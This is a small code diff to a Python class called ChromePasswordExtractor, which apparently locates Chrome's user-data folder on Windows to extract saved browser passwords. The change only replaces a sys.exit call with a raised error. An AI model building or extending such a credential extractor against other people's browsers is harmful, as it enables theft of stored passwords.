@@ -15,7 +15,7 @@ class ChromePasswordExtractor:
     def __init__(self, output_file=None, verbose=False):
         if sys.platform != 'win32':
             logging.error("This script is designed for Windows only.")
-            sys.exit(1)
+            raise RuntimeError("This script is designed for Windows only.")
         self.base_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data")
         self.output_file = output_file
         if verbose:
